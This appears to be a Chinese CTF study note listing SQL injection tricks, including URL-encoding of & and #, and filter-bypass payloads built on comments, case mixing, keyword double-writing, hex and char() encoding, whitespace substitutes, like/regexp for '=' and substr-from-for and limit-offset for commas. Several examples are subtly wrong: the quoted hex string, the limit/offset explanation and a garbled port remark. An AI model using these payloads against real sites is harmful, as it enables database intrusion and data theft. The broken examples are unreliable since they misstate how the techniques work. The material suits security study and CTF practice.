# ==SQL注入 trick 技巧==

**任何题目都是具有套路或者技巧，即trick**



## http协议Trick

URL中字符的特殊含义： 

```
1. &  表示 GET 方式提交参数的分隔符 a=1&b=2，如果在SQL注入过程中，将 and 替换为 && ， 要对&进行URL编码 && =》 %26%26

2. # 在URL中表示锚点，在sql中表示注释 ，为了 # 可以在sql语句中生效，我们也应该对 # 进行对应的编码 # =》 %23

3.Web站点默认访问 index 开头的页面，http://ctf.xxx.com/?id=1  实际上是省略掉了该网站的默认跳转页面index.php 所以实际上的网站应该是 http://ctf.xxx.com/index.php?id=1

4.Web站点默认使用80端口，可省略。http://ctf.xxx.com:8080/?id=1 , 如果得80端口，则不可省略该端口
```





## 绕过过滤方式



```sql
1.常用注释符 （引号逃逸使用）
--空格注释内容  --+注释内容   /*注释内容*/   #注释内容

2.大小写绕过 SQL 不区分大小写
select * from admin where id = 1;
select * from admin where id = 1 UniOn SelEcT 1,2,3,4,5;

3.双写绕过
select * from admin where id = 1;
select * from admin where id = 1 UnunionioN SeleCt 1,2,3,4,5;

4.内敛联注释绕过
select * from admin where id = 1;
select * from admin where id = 1 UniOn /*!SeleCt*/ 1,2,3,4,5;

5.单引号过滤
select * from admin where id = 1;
select * from admin where id = 1 union select 1,2,table_name,4,5 from information_schema.tables where table_schema = 'web_sql';

十六进制绕过
select * from admin where id = 1;
select * from admin where id = 1 union select 1,2,table_name,4,5 from information_schema.tables where table_schema = '0x7765625F73716C';

char函数绕过
select * from admin where id = 1;
select * from admin where id = 1 union select 1,2,table_name,4,5 from information_schema.tables where table_schema = char(119)+char(101)+char(98)+char(95)+char(115)+char(113)+char(108);


6.空格过滤

括号绕过 （查什么，从哪里，符合条件）
select(id)from(admin)where(id=1);

注释绕过  空格=》/**/
select/**/*/**/from/**/admin;

反引号绕过（数据库默认识别关键字，不需要加引号，但是无法自动识别用户定义的表名和字段名，此时可以使用反引号指定）
select * from`admin`where`id`=1;

其他空白字符绕过
# ASCII table：
#  TAB    09     horizontal   TAB
#  LF     0A     new line
#  FF     0C     new page
#  CR     0D     carriage return
使用URL编码：%09，%0A，%0C，%0D

mysql> select
	-> *
	-> from
	-> admin
	-> where
	-> id
	-> =
	-> 1
	-> ;
	
	id  username  password
	1   admin     flag{e10adc3949be59abbe56e057f2gf883e}
	1 row in set fg.a sec)
```

![image-20230907133845273](https://gitee.com/ymq_typroa/typroa/raw/main/image-20230907133845273.png)

```sql
7.等号过滤

like 或 rlike 绕过
mysql> select * from admin where username like 'admin';
```

![image-20230907135819842](https://gitee.com/ymq_typroa/typroa/raw/main/image-20230907135819842.png)

```sql
mysql> select * from admin where username rlike 'admin';
```

![image-20230907135922020](https://gitee.com/ymq_typroa/typroa/raw/main/image-20230907135922020.png)

```sql
between...and...绕过
mysql> select * from admin where username between 'admin' and 'admin';
```

![image-20230907140502048](https://gitee.com/ymq_typroa/typroa/raw/main/image-20230907140502048.png)

```sql
regexp 绕过
select * from admin where username regexp 'admin';
```

![image-20230907140735983](https://gitee.com/ymq_typroa/typroa/raw/main/image-20230907140735983.png)





```sql
8.逗号过滤
盲注过程中，需要使用 substr、substring、mid等字符串截取函数、limit m,n截取记录，都要使用逗号。

substr('字符串',start,length)使用substr('字符串',from start for length)替换

mysql> select substr('admin',1,1);
mysql> select substr('admin' from 1 for 1);

```

![image-20230907141742227](https://gitee.com/ymq_typroa/typroa/raw/main/image-20230907141742227.png)



```sql
limit m,n 使用 limit m offset n 替换
mysql> select * from admin limit 0,1;
mysql> select * from admin limit 1 offset 0;
```

**注意：这里的offset与limit中的   m  n 的位置是相反的，limit m,n的意思是限制，也就是相当于从下标为m的地方开始，限制n个位置的大小。但m offset n的意思是,从第m个位置开始，向后偏移n个单位的大小，所以offset前的m是不能为0的**

![image-20230907142248512](https://gitee.com/ymq_typroa/typroa/raw/main/image-20230907142248512.png)





**小结：**

**1.http中的Trick必备**

**2.常用的绕过方式**